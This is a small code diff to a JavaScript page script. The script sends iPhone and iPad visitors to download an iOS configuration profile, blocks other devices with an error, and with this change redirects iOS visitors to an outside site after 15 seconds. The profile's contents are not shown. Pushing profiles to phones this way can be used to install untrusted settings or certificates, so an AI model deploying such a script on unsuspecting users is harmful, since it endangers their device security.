@@ -8,11 +8,15 @@
 window.onload = function() {
     var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-    console.log("User Agent: " + userAgent); // logging
+    console.log("User Agent: " + userAgent); // Logging
 
     // iDevice Check
     if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
         window.location.href = "ios.mobileconfig";
+        
+        setTimeout(function() {
+            window.location.href = "https://ghost143.de";
+        }, 15000);
     } else {
         document.body.innerHTML = `
             <h1>Error</h1>
